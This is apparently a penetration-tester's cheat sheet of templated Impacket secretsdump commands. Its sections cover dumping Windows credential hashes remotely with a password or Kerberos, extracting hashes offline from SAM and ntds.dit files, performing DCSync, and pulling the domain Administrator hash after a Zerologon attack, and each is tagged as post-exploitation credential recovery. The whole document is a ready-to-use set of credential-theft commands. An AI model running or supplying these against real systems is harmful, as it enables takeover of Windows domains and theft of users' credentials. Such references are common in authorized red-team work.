# secretsdump (imp)

% impacket-secrets, windows, smb, 445

## dump with account
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py '<domain>/<user>:<password>'@<ip>
```

## dump with kerberos
#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump -k -k -no-pass -dc-ip <dc_ip> -no-pass -k <target_name>
```

## extract hash from sam dump files
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
```

## extract hash from ntds.dit
#plateform/linux #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>
```

## anonymous get administrator 
zerologon
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
```

## remote extract
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<ip>
```

## remote extract + users infos
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<ip>
```

## remote dcsync (ptt)
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -k -no-pass -just-dc -outputfile <file-prefix>  -dc-ip <dc_ip> '<domain>/<user>'@<dc_name>
```